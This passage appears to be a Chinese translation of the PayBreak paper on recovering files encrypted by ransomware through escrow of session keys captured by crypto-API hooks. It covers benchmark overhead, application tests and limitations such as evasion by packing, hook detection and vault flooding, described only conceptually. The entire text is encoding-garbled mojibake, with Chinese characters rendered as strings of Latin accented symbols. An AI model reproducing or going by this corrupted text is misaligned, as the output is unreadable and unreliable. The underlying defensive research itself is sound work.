·æœ¬å¯¹æˆ‘ä»¬æ–‡æ¡£è¯­æ–™åº“ä¸­çš„271ä¸ªæ–‡ä»¶è¿›è¡Œäº†åŠ å¯†ï¼Œè€Œå—å½±å“çš„æ–‡ä»¶åœ¨26så†…è¢«æ¢å¤ã€‚Cryptowallå’ŒAlma Lockeræ ·æœ¬å¯¹å°‘é‡æ–‡ä»¶è¿›è¡Œäº†åŠ å¯†ï¼Œå¯èƒ½æ˜¯ç”±äºæ¶æ„è½¯ä»¶çš„ä¸ç¨³å®šæ€§æ‰€è‡´ï¼Œå³å®ƒä»¬åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å´©æºƒäº†ï¼›ä½†æ˜¯ï¼Œå°½ç®¡å¦‚æ­¤ï¼Œè¿™äº›æµ‹è¯•è¯æ˜PayBreakèƒ½å¤Ÿåœ¨çŸ­æ—¶é—´å†…ï¼Œå³æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿå‡ å°æ—¶çš„è§„æ¨¡å†…ï¼Œä»å‹’ç´¢è½¯ä»¶æ”»å‡»ä¸­å®Œå…¨æ¢å¤æ‰€æœ‰æ–‡ä»¶ã€‚ Performance Impactsåœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å›ç­”RQ3ï¼Œå®ƒè¯„ä¼°äº†PayBreakå¯¹æ€§èƒ½çš„å½±å“ã€‚ å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯¹ä¸¤ä¸ªç‰¹å¾æ„Ÿå…´è¶£ã€‚PayBreakå¯¹å•ä¸ªè°ƒç”¨åŠ å¯†APIï¼ˆå³å¾®å‹åŸºå‡†ï¼‰ä¼šé€ æˆä½•ç§æ”¾ç¼“ï¼Œä»¥åŠåœ¨å¸¸è§„åŠå…¬å®¤å·¥ä½œè´Ÿè½½ï¼ˆå³å®åŸºå‡†ï¼‰æœŸé—´å¯¹åŠ å¯†APIçš„è°ƒç”¨é¢‘ç‡å¦‚ä½•ã€‚ æˆ‘ä»¬è¯„ä¼°äº†è¿è¡ŒWindows 7 32ä½è™šæ‹Ÿæœºï¼Œ2GB RAMå’Œ2ä¸ª2.20GHz CPUå†…æ ¸çš„ä¸€èˆ¬ç¬”è®°æœ¬ç”µè„‘çš„æ€§èƒ½ã€‚ Micro benchmarkä¸ºäº†è¡¡é‡ä½¿ç”¨Detours hookçš„CryptoAPIå‡½æ•°çš„ç³»ç»Ÿå¼€é”€ï¼Œæˆ‘ä»¬åœ¨1KBæ–‡ä»¶ä¸Šæ‰§è¡Œäº†1000ä¸‡æ¬¡CryptEncrypt APIè°ƒç”¨çš„å¾®åŸºå‡†æµ‹è¯•ã€‚æˆ‘ä»¬å‘ç°åœ¨æ²¡æœ‰hookçš„æƒ…å†µä¸‹èŠ±è´¹äº†4.02sã€‚å¯ç”¨PayBreakï¼Œå°†ä¼šè¯å¯†é’¥å’ŒåŠ å¯†æ–¹æ¡ˆä¿¡æ¯å¯¼å‡ºåˆ°å¯†é’¥åº“åï¼ŒåŠ å¯†å¾ªç¯èŠ±è´¹äº†1,242sã€‚ å› æ­¤ï¼Œå¹³å‡ä¸€æ¬¡å¯¹CryptEncrypt APIçš„è°ƒç”¨è¦èŠ±è´¹124Âµsï¼ˆå³é€Ÿåº¦é™ä½310å€ï¼‰ã€‚ä½†æ˜¯ï¼Œå¤§å¤šæ•°æ€§èƒ½å½±å“æ¥è‡ªå†™å…¥å¯†é’¥åº“çš„I / Oæ“ä½œã€‚ ä»æµ‹é‡ä¸­çœç•¥ç£ç›˜I / Oå¯ä½¿é€Ÿåº¦é™ä½åˆ°1.5å€ã€‚å› æ­¤ï¼ŒPayBreakçš„ç®€å•æ€§èƒ½ä¼˜åŒ–å¯ä»¥æ˜¯åœ¨ä¸“ç”¨ I/O çº¿ç¨‹ä¸­æ‰§è¡Œå¯¹å¯†é’¥åº“çš„å†™å…¥æ“ä½œï¼Œå®é™…çš„å·¥ä½œè´Ÿè½½æ¯”ä¸Šé¢è®¨è®ºçš„ç»¼åˆæœ€åæƒ…å†µåŸºå‡†é­å—çš„æ€§èƒ½å½±å“è¦å°å¾—å¤šã€‚ Macro benchmarkå°½ç®¡å¯¹åŠ å¯†APIçš„å•ä¸ªè°ƒç”¨çš„ç›¸å¯¹æ€§èƒ½å½±å“å¾ˆå¤§ï¼Œä½†æ˜¯åœ¨å¸¸è§„åŠå…¬å®¤å·¥ä½œè´Ÿè½½ä¸­è¿™ç§æ“ä½œæä¸ºç½•è§ã€‚ å¯¹äºæˆ‘ä»¬çš„å®åŸºå‡†æµ‹è¯•ï¼Œæˆ‘ä»¬åœ¨é…å¤‡PayBreakçš„è™šæ‹Ÿæœºä¸Šä½¿ç”¨äº†å¸¸è§çš„Windowsè½¯ä»¶ã€‚ æˆ‘ä»¬æ‰§è¡Œçš„Windowsè½¯ä»¶åŒ…æ‹¬ï¼š7zipï¼ŒAVGï¼ŒDropboxï¼ŒFirefoxï¼ŒGimp 2ï¼ŒGoogle Chromeï¼ŒGoogle Driveï¼ŒInternet Explorerï¼ˆIEï¼‰ï¼ŒiTunesï¼ŒKeePass 2ï¼ŒLibreOfficeï¼ŒMicrosoft Excelï¼ŒMicrosoft Powerpointï¼ŒMicrosoft Wordï¼ŒPidginï¼ŒPuttyï¼Œ RealVNCï¼ŒSkypeï¼ŒSumatraPDFï¼ŒWinSCPï¼ŒWinZipã€‚ ç”±äºç¯‡å¹…æ‰€é™ï¼Œæˆ‘ä»¬æ— æ³•é’ˆå¯¹æˆ‘ä»¬æµ‹è¯•çš„æ¯ä¸ªåº”ç”¨ç¨‹åºå®Œæ•´åˆ†ææˆ‘ä»¬çš„æµ‹è¯•ç¨‹åºã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬æä¾›äº†å¯¹äº”ä¸ªåº”ç”¨ç¨‹åºåˆ†æçš„æŠ¥å‘Šã€‚æˆ‘ä»¬å‘ç°ä»»ä½•åº”ç”¨ç¨‹åºéƒ½æ²¡æœ‰æ˜æ˜¾çš„é€Ÿåº¦ä¸‹é™ï¼Œå¹¶ä¸”å¸¸è§„åº”ç”¨ç¨‹åºä½¿ç”¨æœŸé—´å¹³å‡å°‘äº100ä¸ªåŠ å¯†APIè°ƒç”¨ã€‚æ¯ä¸ªåº”ç”¨ç¨‹åºåç§°åé¢çš„æ‹¬å·ä¸­çš„æ•°å­—æ˜¯æˆ‘ä»¬åœ¨æµ‹è¯•æœŸé—´ä»åº”ç”¨ç¨‹åºè®°å½•çš„CryptoAPIè°ƒç”¨çš„æ•°é‡ã€‚ KeePass 2 (28)æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å¯†ç æ•°æ®åº“ï¼Œå¹¶ä½¿ç”¨è¯¥åº”ç”¨ç¨‹åºéšæœºç”Ÿæˆäº†3ä¸ªå¯†ç ã€‚ æˆ‘ä»¬åˆ é™¤äº†è¯¥æ•°æ®åº“ï¼Œå¹¶åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç©ºæ•°æ®åº“ã€‚ ç„¶åï¼Œæˆ‘ä»¬å¯¼å…¥äº†ä¸€ä¸ªæ—§æ•°æ®åº“ã€‚ æˆ‘ä»¬æ³¨æ„åˆ°ä»»ä½•è¿™äº›æ“ä½œéƒ½æ²¡æœ‰å˜æ…¢ï¼Œå¹¶ä¸”è¯¥åº”ç”¨ç¨‹åºå®Œå…¨æ­£å¸¸å·¥ä½œã€‚ KeePass 2ä¼¼ä¹æ˜¯CryptoAPIçš„ä¸åŒç”¨æˆ·ï¼Œå› ä¸ºæˆ‘ä»¬è§‚å¯Ÿåˆ°CryptoAPIè¢«è°ƒç”¨çš„å…­ä¸ªä¸åŒåŠŸèƒ½ã€‚ Dropbox (127)æˆ‘ä»¬ä½¿ç”¨è¯¥ç¨‹åºç™»å½•äº†ä¸€ä¸ªDropboxå¸æˆ·ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†è¯¥å¸æˆ·ä¸­å…ˆå‰å­˜æ”¾åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šçš„3ä¸ªæ–‡ä»¶åŒæ­¥ã€‚ç„¶åï¼Œé€šè¿‡å°†æ–‡ä»¶æ‹–åˆ°Dropboxæ–‡ä»¶å¤¹ä¸­ï¼Œå°†5ä¸ªæ–‡ä»¶ä»æœ¬åœ°è®¡ç®—æœºåŒæ­¥åˆ°äº‘ä¸­ã€‚ æˆ‘ä»¬æ³¨æ„åˆ°åŒæ­¥æœŸé—´æ²¡æœ‰é€Ÿåº¦ä¸‹é™ï¼Œä¹Ÿæ²¡æœ‰ç¨‹åºå´©æºƒã€‚åœ¨æˆ‘ä»¬çš„æµ‹è¯•æœŸé—´ï¼ŒDropboxè¿›è¡Œçš„å¤§å¤šæ•°CryptoAPIè°ƒç”¨éƒ½æ˜¯é’ˆå¯¹CryptGenRandomçš„ã€‚ Putty (2)æˆ‘ä»¬è¿æ¥äº†è¿œç¨‹SSHæœåŠ¡å™¨å¹¶æ‰§è¡Œäº†å‡ ä¸ªå‘½ä»¤ï¼Œéšåä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥ã€‚ æ­¤åº”ç”¨ç¨‹åºå¹¶ä¸é¢‘ç¹è°ƒç”¨CryptoAPIï¼Œæˆ‘ä»¬æ²¡æœ‰å‘ç°é€Ÿåº¦å˜æ…¢æˆ–ç¨‹åºä¸ç¨³å®šçš„æƒ…å†µã€‚ Skype (19,418)æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªSkypeå¸æˆ·ï¼Œ æ·»åŠ äº†2ä¸ªè”ç³»äººå¹¶å‘é€äº†æ¶ˆæ¯ã€‚ ç„¶åï¼Œæˆ‘ä»¬ç»™è¿™äº›è”ç³»äººä¸­çš„1ä¸ªæ‰“ç”µè¯ã€‚ Skypeé¢‘ç¹è°ƒç”¨CryptoAPIï¼Œæ¯”æˆ‘ä»¬è§‚å¯Ÿåˆ°çš„ä»»ä½•å…¶ä»–ç¨‹åºéƒ½è¦å¤šã€‚ ä½†æ˜¯ï¼Œå³ä½¿ä½¿ç”¨ç‡å¦‚æ­¤ä¹‹é«˜ï¼Œä¹Ÿè¿œè¿œè¶…è¿‡ä»»ä½•å…¶ä»–ç¨‹åºï¼Œæˆ‘ä»¬ä¹Ÿæ²¡æœ‰å‘ç°é€Ÿåº¦å‡æ…¢æˆ–ç¨‹åºä¸ç¨³å®šã€‚ Internet Explorer (3,328)æˆ‘ä»¬ä½¿ç”¨AutoItç¨‹åºæ¥å®ç°IEè‡ªåŠ¨åŒ–ï¼Œä»è€Œåœ¨å…¶HTTPSä¸»é¡µä¸Šè®¿é—®Alexaæœ€å—æ¬¢è¿çš„100ä¸ªç½‘ç«™ã€‚æˆ‘ä»¬åœ¨æ¯ä¸ªé¡µé¢ä¸Šåœç•™5ç§’é’Ÿä»¥è®©é¡µé¢å®Œå…¨åŠ è½½ã€‚æˆ‘ä»¬å‘ç°æ¯ä¸ªç½‘é¡µï¼ˆåŒ…æ‹¬æ‰€æœ‰èµ„æºï¼‰å¹³å‡å¯¹CryptoAPIè°ƒç”¨33æ¬¡ã€‚å› æ­¤ï¼Œå³ä½¿æ¯æ¬¡åŠ å¯†æ“ä½œæœªä¼˜åŒ–çš„å‡æ…¢é€Ÿåº¦ä¸º124Âµsï¼Œè¿™ä¹Ÿå¯¼è‡´é¡µé¢åŠ è½½çš„å¼€é”€ä»…ä¸º4.1msï¼Œæ˜æ˜¾ä½äºäººç±»çš„æ„ŸçŸ¥é˜ˆå€¼ã€‚ è®¨è®ºå’Œç³»ç»Ÿé™åˆ¶åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºå°½ç®¡æˆ‘ä»¬çš„ç³»ç»Ÿå­˜åœ¨æˆ–ç”±äºæˆ‘ä»¬çš„ç³»ç»Ÿè€Œå­˜åœ¨çš„æŒ‘æˆ˜ã€å¼€æ”¾æ€§é—®é¢˜å’Œé™åˆ¶ã€‚ä¸€ä¸ªå¾®ä¸è¶³é“çš„ï¼Œçœ‹ä¼¼æœ‰æ•ˆçš„é˜²å¾¡å‹’ç´¢è½¯ä»¶æ˜¯ä¸€ä¸ªå¯é çš„å¤‡ä»½ã€‚æœ‰äº†è¿™æ ·ä¸€ä¸ªå¤‡ä»½ï¼Œç”¨æˆ·å°±ä¸ç”¨æ‹…å¿ƒå‹’ç´¢è½¯ä»¶çš„æ”»å‡»äº†ï¼Œæ¢å¤æ‰€éœ€çš„åªæ˜¯æ“¦é™¤å¹¶é‡æ–°å®‰è£…å—æ„ŸæŸ“çš„è®¡ç®—æœºï¼Œå¹¶ä»å¤‡ä»½ä¸­æ¢å¤æ•°æ®ã€‚è™½ç„¶å¾ˆç®€å•ï¼Œä½†æ˜¾ç„¶è¿‡å»æˆä¸ºå‹’ç´¢è½¯ä»¶å—å®³è€…å¹¶æ”¯ä»˜èµé‡‘çš„ç”¨æˆ·å¹¶æ²¡æœ‰è¿™ç§ç®€å•çš„æœºåˆ¶ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè®©æ‰€æœ‰ç”¨æˆ·å…¨é¢ä½¿ç”¨å¤‡ä»½ä¼¼ä¹æ˜¯ä¸ç°å®çš„ã€‚ æ­¤å¤–ï¼Œæ®æŠ¥é“ï¼Œä¸€äº›æœ€è¿‘çš„å‹’ç´¢è½¯ä»¶ç³»åˆ—ï¼ˆä¾‹å¦‚RansomWebæˆ–CryptoWallï¼‰åœ¨æ„ŸæŸ“åç«‹å³åŠ å¯†æ–‡ä»¶ï¼Œå¹¶é€šè¿‡åœ¨è®¿é—®æ—¶é€æ˜åœ°è§£å¯†æ•°æ®æ¥åœ¨æœ‰é™çš„æ—¶é—´æ®µï¼ˆä¾‹å¦‚å‡ ä¸ªæœˆï¼‰å†…æä¾›å¯¹æ•°æ®çš„è®¿é—®æƒé™ã€‚ ä¸€æ—¦æ­¤åˆå§‹æœŸé™åˆ°æœŸï¼Œæ¶æ„è½¯ä»¶å°±ä¼šç ´åè§£å¯†æ‰€éœ€çš„å¯†é’¥ï¼Œå¹¶è¦æ±‚å‹’ç´¢ã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œè‡ªæ„ŸæŸ“ä»¥æ¥ï¼ˆå‡å¦‚åªæœ‰å‡ ä¸ªæœˆï¼‰è¿›è¡Œçš„æ‰€æœ‰å¤‡ä»½ä»…åŒ…å«åŠ å¯†æ•°æ®ï¼Œå› æ­¤æ— æ³•ä»æ„ŸæŸ“ä¸­æ¢å¤ã€‚ PayBreakçš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå…³é”®æ‰˜ç®¡ç³»ç»Ÿã€‚æ”¿åºœæå‡ºå¹¶å¼ºåˆ¶è¦æ±‚çš„å¯†é’¥ä»£ç®¡åˆ¶åº¦ä¸€ç›´å—åˆ°ç ”ç©¶ç•Œå’Œéšç§æƒå€¡å¯¼è€…çš„æ‰¹åˆ¤ã€‚æˆ‘ä»¬å®Œå…¨èµåŒè¿™ä¸€è§‚ç‚¹ï¼Œå¹¶å¼ºçƒˆåå¯¹æ”¿åºœè§„å®šçš„å¯†é’¥ä»£ç®¡åˆ¶åº¦ã€‚ä½†æ˜¯ï¼Œæ­¤ç±»æ”¿åºœå¼ºåˆ¶æ€§ææ¡ˆä¸PayBreakä¹‹é—´å­˜åœ¨æ ¹æœ¬å·®å¼‚ã€‚åœ¨PayBreakä¸­ï¼Œä»…å­˜åœ¨ä¸€ä¸ªæœ‰æƒè®¿é—®ä¿å­˜åœ¨å¯†é’¥åº“ä¸­çš„å¯†é’¥çš„å®ä½“-åˆæ³•ç”¨æˆ·è‡ªå·±ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤äº†ç”¨æˆ·æœ¬äººä¹‹å¤–ï¼Œæ²¡æœ‰å¯ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ã€‚ æˆ‘ä»¬çš„PayBreakåŸå‹å®ç°ä½¿ç”¨å¤šä¸ªåŠ¨æ€æˆ–é™æ€é“¾æ¥çš„åº“æ¥å‡»è´¥å‹’ç´¢è½¯ä»¶ã€‚å‹’ç´¢è½¯ä»¶çš„ä½œè€…å¯èƒ½ä¼šä¸ºäº†ç ´è§£PayBreakè€Œå°è¯•æ¨å‡ºè‡ªå·±çš„å¯†ç åº“ã€‚ä½†æ˜¯ï¼Œè¿™é€šå¸¸ä¼šå¯¼è‡´è½¯ä»¶çš„å¤±è´¥ï¼ˆä¾‹å¦‚ï¼Œåƒµå°¸ç½‘ç»œç®¡ç†å‘˜ä½¿ç”¨çš„ç®€å•åŠ å¯†ä½¿ä»–ä»¬çš„Cï¼†Cåè®®æ˜“äºé€†å‘ï¼‰ï¼Œå› æ­¤å‹’ç´¢è½¯ä»¶ä½œè€…æ›´å€¾å‘äºåˆ©ç”¨å®‰å…¨çš„ç¬¬ä¸‰æ–¹åº“ã€‚ä½†æ˜¯ï¼Œå®‰å…¨çš„åŠ å¯†åº“å¾ˆå°‘ï¼Œåªæœ‰æœ‰é™çš„ä¸€äº›å¯ä¾›é€‰æ‹©ã€‚è€Œå¯¹äºæˆ‘ä»¬çš„ç³»ç»Ÿæ¥è¯´ï¼Œä¸ºç¬¬ä¸‰æ–¹åº“æˆ–è‡ªå®šä¹‰åº“åˆ›å»ºç­¾åå¹¶æ²¡æœ‰éš¾åº¦ã€‚æˆ‘ä»¬ä½¿ç”¨ä¸‰ç§ä¸åŒçš„åº“çš„æµ‹è¯•ç»éªŒè¡¨æ˜ï¼Œå¯ä»¥è½»æ¾å¿«é€Ÿåœ°æ·»åŠ å¯¹æ›´å¤šåº“çš„æ”¯æŒã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¼€å‘äº†åœ¨ä¸€å¤©ä¹‹å†…æ£€æµ‹Crypto++æ‰€éœ€çš„ç­¾åã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬çš„åŸå‹è¿˜hookäº†Windowsæ ‡å‡†çš„CSPRNGå‡½æ•° CryptGenRandomã€‚é€šè¿‡åŠ¨æ€hookingå¹¶è®°å½•è¯¥ç³»ç»ŸåŠŸèƒ½ï¼ŒPayBreakå¯ä»¥åˆ©ç”¨ä»»ä½•å…¶ä»–å‹’ç´¢è½¯ä»¶åº“å­˜å‚¨ä»»ä½•å‹’ç´¢è½¯ä»¶ä½¿ç”¨çš„ä¼šè¯å¯†é’¥çš„åŸºç¡€èµ„æ–™ã€‚æ— è®ºä½¿ç”¨ä»€ä¹ˆä»£ç ï¼Œæ¶æ„è½¯ä»¶åˆ†æäººå‘˜åªéœ€è¯†åˆ«ä¸€æ¬¡åŠ å¯†å®ç°ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°PayBreakå³å¯æ·»åŠ æ”¯æŒã€‚è¯†åˆ«å¯†ç ä¸å¿…æ˜¯æ‰‹å·¥çš„ï¼Œç›¸åï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼ä½¿è¯¥è¿‡ç¨‹è‡ªåŠ¨åŒ–ã€‚ä¸€æ—¦è¯†åˆ«å‡ºå¯†ç ï¼Œä¾¿å­˜åœ¨å¤§é‡æœ‰åŠ©äºè¯†åˆ«ç›¸ä¼¼ä»£ç çš„å·¥ä½œã€‚ä¸ºäº†å®Œå…¨é¿å¼€å¯¹ç§°å¯†é’¥çš„ä½¿ç”¨ï¼Œå‹’ç´¢è½¯ä»¶çš„ä½œè€…å¯èƒ½ä¼šå€¾å‘äºä½¿ç”¨å®Œå…¨éå¯¹ç§°çš„åŸè¯­æ¥åŠ å¯†æ•°æ®ã€‚å°½ç®¡è¿™ç§ç­–ç•¥æ˜¯å¯è¡Œçš„ï¼Œä½†å¯ä»¥é€šè¿‡ç›‘è§†è¿™äº›æ–¹é¢çš„å¯å‘å¼æ–¹æ³•æ¥è§£å†³é«˜èµ„æºéœ€æ±‚å’Œéå¯¹ç§°åŠ å¯†å¼‚å¸¸é¢‘ç¹åœ°ä½¿ç”¨çš„é—®é¢˜ã€‚å°½ç®¡PayBreakè¡¨ç°å‡ºäº†å¯¹å½“ä»£åŠ å¯†å‹’ç´¢è½¯ä»¶çš„æœ‰æ•ˆæ€§ï¼Œä½†å®é™…éƒ¨ç½²ä»å¿…é¡»è§£å†³æœ¬æ–‡æœªæ¶‰åŠçš„å‡ ä¸ªé—®é¢˜ã€‚è¿™äº›é—®é¢˜åŒ…æ‹¬ï¼Œä¾‹å¦‚ï¼Œç”¨æˆ·å¦‚ä½•ä¿æŠ¤ç§é’¥çš„å®‰å…¨ï¼Œæˆ–ä¸ºå¯†é’¥åº“å®æ–½å®‰å…¨çš„è½®è½¬ç³»ç»Ÿï¼Œä»¥é˜²æ­¢åº“çš„æ— é™å¢é•¿ã€‚ å¦‚å‰æ‰€è¿°ï¼ŒPayBreakèƒ½å¤Ÿåœ¨å‡ å°æ—¶å†…ä»å‹’ç´¢è½¯ä»¶æ”»å‡»ä¸­æ¢å¤ï¼Œé€šè¿‡è¯¦å°½æœç´¢ï¼Œæ–‡ä»¶æ¢å¤ç‹¬ç«‹äºå‹’ç´¢è½¯ä»¶ã€‚è¿™ç§è¯¦å°½çš„æœç´¢æ˜¯ä¸€ç§å¹¶è¡Œçš„å·¥ä½œè´Ÿè½½ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å…¶ä»–è®¡ç®—èµ„æºï¼ˆä¾‹å¦‚äº‘éƒ¨ç½²ï¼‰å‡ ä¹ä»»æ„åœ°è¿›è¡Œä¼˜åŒ–ã€‚æ­¤å¤–ï¼Œéœ€è¦ä»å‹’ç´¢è½¯ä»¶æ„ŸæŸ“ä¸­æ¢å¤åº”è¯¥æ˜¯ä¸€ç§ç½•è§çš„ç‰¹å®šæƒ…å†µã€‚ æˆ‘ä»¬è®¤ä¸ºï¼Œå¯¹äºå¸¸è§„çš„å‹’ç´¢è½¯ä»¶å—å®³è€…è€Œè¨€ï¼Œä¸å¯æ¢å¤åŠ å¯†æ–‡ä»¶çš„é€Ÿåº¦ç›¸æ¯”ï¼Œé‡æ–°è·å¾—å¯¹åŠ å¯†æ•°æ®çš„è®¿é—®æ›´ä¸ºé‡è¦ã€‚ æˆ‘ä»¬æ‰¿è®¤ï¼Œä¸å¤§éƒ¨åˆ†å®ç”¨çš„åœ¨çº¿ä¿æŠ¤ç³»ç»Ÿä¸€æ ·ï¼Œæ··æ·†å’ŒåŠ å£³å¯ä»¥ç ´åPayBreakæä¾›çš„ä¿æŠ¤ã€‚ä½†æ˜¯ï¼Œæ··æ·†åªæ˜¯é™æ€é“¾æ¥åˆ°åŠ å¯†åº“çš„æ¶æ„è½¯ä»¶çš„å…³æ³¨ç‚¹ã€‚ç”±äºä½¿ç”¨PayBreakä¼šåœ¨æœªæ··æ·†çš„ç³»ç»ŸDLLä¸­æŒ‚é’©APIå‡½æ•°çš„å®ç°ï¼Œå› æ­¤ä¸ä¼šå—åˆ°ä½¿ç”¨ç³»ç»Ÿæä¾›çš„CryptoAPIçš„æ¶æ„è½¯ä»¶çš„ç»•è¿‡ã€‚æ­¤å¤–ï¼Œæ­£å¦‚æˆ‘ä»¬çš„è¯„ä¼°æ‰€ç¤ºï¼ŒPayBreakå®Œå…¨èƒ½å¤Ÿä¿æŠ¤ç”¨æˆ·å…å—é™æ€é“¾æ¥åŠ å¯†åº“çš„æ¶æ„è½¯ä»¶çš„ä¾µå®³ï¼Œåªè¦è¯¥æ¶æ„è½¯ä»¶è¢«ç°ä»£åŠ å£³ç¨‹åºæ‰€æ··æ·†å³å¯ã€‚å®é™…ä¸Šï¼Œæ‰€æœ‰ç”¨äºè¯„ä¼°çš„æ¶æ„è½¯ä»¶æ ·æœ¬éƒ½å·²åŠ å£³ï¼Œè€Œä¸”æ¥è‡ªToxå®¶æ—çš„æ ·æœ¬é™æ€é“¾æ¥äº†Crypto++åº“ã€‚å¤šå¹´æ¥ï¼Œå­¦æœ¯æ–‡çŒ®å’Œå•†ä¸šèµ„æºå·²æä¾›äº†é«˜çº§æ··æ·†å™¨ã€‚ä½†æ˜¯ï¼Œè¿™äº›å…ˆè¿›æŠ€æœ¯å¹¶æœªåœ¨æ•´ä¸ªæ¶æ„è½¯ä»¶ç”Ÿæ€ç³»ç»Ÿä¸­å¹¿æ³›ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼ŒSun[6]æŠ¥å‘Šè¯´ï¼Œåœ¨103,392ä¸ªåˆ†æçš„æ ·æœ¬ä¸­ï¼Œæœ‰91ï¼…ä»…ä½¿ç”¨ç®€å•çš„åŠ å£³è½¯ä»¶ï¼ˆä¾‹å¦‚UPXæˆ–ASPackï¼‰ï¼Œè¿™äº›å£³ä¸ä¼šç»•è¿‡PayBreakæä¾›çš„ä¿æŠ¤ã€‚ä¸å¹¸çš„æ˜¯ï¼Œæˆ‘ä»¬ä¸çŸ¥é“é˜»æ­¢æ¶æ„è½¯ä»¶ä½œè€…å¹¿æ³›ä½¿ç”¨æ›´é«˜çº§çš„æ··æ·†æŠ€æœ¯çš„åŸå› ï¼Œå› æ­¤ï¼ŒPayBreakæé«˜äº†æ¶æ„è½¯ä»¶ä½œè€…çš„é—¨æ§›ï¼Œå¹¶è¿«ä½¿ä»–ä»¬ä½¿ç”¨è¿„ä»Šä¸ºæ­¢ä»–ä»¬ä¸€ç›´æ‹’ç»é‡‡ç”¨çš„ç»•è¿‡æŠ€æœ¯ã€‚ æ¶æ„è½¯ä»¶å¯ä»¥å®æ–½çš„å¦ä¸€ç§ç»•è¿‡PayBreakçš„æ–¹æ³•å³æ£€æµ‹åˆ°å—å®³è€…çš„è®¡ç®—æœºä¸­æ˜¯å¦æ­£åœ¨è¿è¡ŒPayBreakï¼Œå¹¶å› æ­¤è·³è¿‡æ’å…¥çš„hookã€‚ä½†æ˜¯ï¼Œæ²¡æœ‰ç†ç”±PayBreakå¿…é¡»åœ¨ç›®æ ‡åŠ å¯†åŠŸèƒ½çš„å¼€å¤´å®‰è£…hookã€‚åªè¦ç›¸å…³æ•°æ®ç»“æ„ï¼ˆä¾‹å¦‚å¯†é’¥å’ŒåŠ å¯†æ–¹æ¡ˆå‚æ•°ï¼‰ä»åœ¨ä½¿ç”¨èŒƒå›´å†…ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹PayBreakä»¥å°†hookæ’å…¥å‡½æ•°ä¸­çš„ä»»æ„ç‚¹ã€‚ä¸æ··æ·†æƒ…å½¢ç±»ä¼¼ï¼ŒPayBreakæ— æ³•æä¾›é’ˆå¯¹ä¸“é—¨æ—¨åœ¨ç»•è¿‡PayBreakçš„æ¶æ„è½¯ä»¶çš„ä¿è¯ï¼Œä½†æ˜¯PayBreakå¯ä»¥å¤§å¤§å‡å°‘æ”»å‡»è€…æˆåŠŸçš„å‡ ç‡ã€‚ æœ€åï¼Œå‘ç°PayBreakå­˜åœ¨çš„å‹’ç´¢è½¯ä»¶å¯ä»¥é€šè¿‡ç ´åç”¨äºåœ¨ä¿ç®¡åº“ä¸­ä¿ç®¡æ•°æ®çš„å…¬é’¥æˆ–ç®€å•åœ°ç”¨æ— æ„ä¹‰çš„ä¿¡æ¯å¡«å……ä¿ç®¡åº“æ¥å‘èµ·DOSæ”»å‡»ã€‚å¯ä»¥å°†PayBreakä¿®æ”¹ä¸ºå…·æœ‰é™„åŠ åˆ°Vaultçš„ç‰¹æƒï¼ˆå¦‚ä»¥SYSTEMèº«ä»½è¿è¡Œï¼‰è¿›ç¨‹ï¼Œä»è€Œä¿æŠ¤å…¬é’¥çš„å®Œæ•´æ€§ã€‚åœ¨å¯¹å—å®³è€…çš„æ–‡ä»¶è¿›è¡ŒåŠ å¯†ä¹‹å‰ï¼Œä½¿æ–‡ä»¶åº“å……æ»¡åƒåœ¾çš„æ”»å‡»åªèƒ½å¢åŠ æ¢å¤åŠ å¯†æ–‡ä»¶æ‰€éœ€çš„æ—¶é—´ï¼Œä¸Šé¢æåˆ°çš„ç‰¹æƒè¿›ç¨‹ä¹Ÿå¯ä»¥æ£€æµ‹åˆ°è¿™ç§æ”»å‡»çš„è¿›è¡Œï¼Œå¹¶å‘ç”¨æˆ·å‘å‡ºè­¦æŠ¥ï¼Œæˆ–è€…ç»ˆæ­¢æœ‰é—®é¢˜çš„è¿‡ç¨‹ã€‚å³ä½¿è¿™ç§æ”»å‡»æ²¡æœ‰å¼•èµ·è­¦æŠ¥ï¼Œè¯·å›æƒ³ä¸€ä¸‹ï¼Œæ„ŸæŸ“å‹’ç´¢è½¯ä»¶æ˜¯ä¸€ç§ç½•è§çš„æƒ…å†µï¼Œè€Œè¯†åˆ«æ­£ç¡®çš„å¯†é’¥å’ŒåŠ å¯†åç§»é‡åˆ™å¾ˆå°´å°¬ã€‚å› æ­¤ï¼Œå³ä½¿ä½¿ç”¨å¤§å‹ä¿ç®¡åº“ï¼ˆä¸€ä¸ª1TBçš„ä¿ç®¡åº“å¯ä»¥å®¹çº³å¤§çº¦170äº¿ä¸ªæ¡ç›®ï¼‰ï¼Œæ¢å¤ä¹Ÿåªä¼šè¢«å»¶è¿Ÿï¼Œè€Œä¸èƒ½é˜»æ­¢ã€‚ æ€»ç»“PayBreakæ˜¯ä¸€ç§åˆ›æ–°çš„ä¿æŠ¤æœºåˆ¶ï¼Œå¯ä»¥è§£å†³åŸºäºåŠ å¯†çš„å‹’ç´¢è½¯ä»¶çš„å¨èƒã€‚æ—©æœŸçš„å‹’ç´¢è½¯ä»¶ç³»åˆ—ç”±äºæœªæ­£ç¡®é…ç½®åŠ å¯†æ¨¡å¼è€Œå¤±è´¥ï¼Œå› è€ŒæˆåŠŸçš„è½¯ä»¶è½¬è€Œä½¿ç”¨æ­£ç¡®çš„åŠ 